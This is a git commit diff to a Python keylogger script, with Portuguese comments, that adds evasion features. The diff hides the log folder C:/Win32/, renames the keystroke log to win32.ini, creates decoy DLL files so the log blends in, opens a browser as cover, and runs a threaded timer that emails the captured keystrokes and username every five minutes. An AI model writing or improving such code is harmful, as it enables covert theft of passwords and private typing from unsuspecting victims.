2763ae1c01610edb08b626d89f9d7d081391ef97
Gustavo Walk <102780641+gustawalk@users.noreply.github.com>
2024-03-11 22:59:55 -0300

    Timer melhorado (5 min) + arquivos fakes

--- app.py
+++ app.py
@@ -6,7 +6,10 @@
 
 import keyboard as kb
 import datetime
+import threading
 import os
+import ctypes
+import time
 import smtplib
 import webbrowser as wb
 from email.mime.multipart import MIMEMultipart
@@ -21,7 +24,8 @@ system_name = os.getenv('USERNAME')
 path = "C:/Win32/"
 if not os.path.exists(path):
     os.mkdir(path)
-filename = "win32config.txt"
+ctypes.windll.kernel32.SetFileAttributesW(path, 0x02) # Fazendo com que a pasta fique invisivel
+filename = "win32.ini" # Arquivo onde o log ficara armazenado
 file = open(f"{path}{filename}", 'a')
 
 # Configs para o email
@@ -42,6 +46,25 @@ def fake_browser():
     url = "https://"
     wb.open(url)
 
+# Criando arquivos fakes para o win32.ini se camuflar entre eles
+def fake_archives():
+    if not os.path.exists(f"{path}win32.dll"):
+        open(f"{path}win32.dll", 'x')
+        open(f"{path}msvcp140.dll", 'x')
+        open(f"{path}vcruntime140.dll", 'x')
+        open(f"{path}ucrtbase.dll", 'x')
+        open(f"{path}vccorlib140.dll", 'x')
+        open(f"{path}api-ms-win-core-libraryloader-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-core-localization-l1-2-0.dll", 'x')
+        open(f"{path}api-ms-win-core-rtlsupport-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-crt-environment-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-crt-string-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-core-debug-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-core-errorhandling-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-core-file-l1-1-0.dll", 'x')
+        open(f"{path}api-ms-win-core-file-l1-2-0.dll", 'x')
+        open(f"{path}api-ms-win-core-file-l2-1-0.dll", 'x')
+
 # Função para realizar o envio do email
 def send_email():
     # Criando um objeto multi part e atribuindo os valores necessarios como remetente, destinatário e assunto do email
@@ -50,6 +73,7 @@ def send_email():
     msg['To'] = email_receiver
     msg['Subject'] = f"Keylogger - {system_name} - {get_hour()}"
     msg.attach(MIMEText(conteudo)) # Anexa o conteudo
+
     with open(f"{path}{filename}", 'r') as attachment:
         attachment_content = attachment.read() # Abrindo o arquivo em modo leitura
 
@@ -69,26 +93,32 @@ def send_email():
     except Exception as e:
         print(f"Erro ao enviar o email: {e}")
 
-def main():
+def timer():
     global file
-    global tempo
 
     tempo = 0
     while True:
+        if tempo < (60 * 5):
+            tempo += 1
+            print(tempo)
+            time.sleep(1)
+        else:
+            file.close()
+            send_email()
+            tempo = 0
+
+def main(): 
+    global file
+
+    # Thread para o timer rodar ao mesmo tempo que o keylogger
+    timer_thread = threading.Thread(target=timer, daemon=True)
+    timer_thread.start()
+
+    while True:
         try:
-            # Timer + ou - funcional para o envio do email
-            if tempo < 1000:
-                tempo += 1
-            else:
-                file.close()
-                send_email()
-                tempo = 0
-
-                # Abrir o arquivo novamente para escrita
-                file = open(f"{path}{filename}", 'a')
-
             # Keylogger em si
             key = kb.read_key()
+            file = open(f"{path}{filename}", 'a')
             if kb.is_pressed(key):
                 
                 # Tratando algumas possibilidades para evitar poluição do arquivo (switch case pref)
@@ -104,17 +134,19 @@ def main():
                     txt = f"[{key}]"
                 elif key == "backspace":
                     txt = "<X>"
-                elif key == "capslock":
+                elif key == "caps lock":
                     txt = f"[CL]"
                 else:
                     txt = key
                 # Escrevendo no arquivo
                 file.write(txt)
+                file.close()
 
         except Exception as e:
             print(f"Erro: {e}")
             break
 
 if __name__ == "__main__":
+    fake_archives()
     fake_browser()
     main()
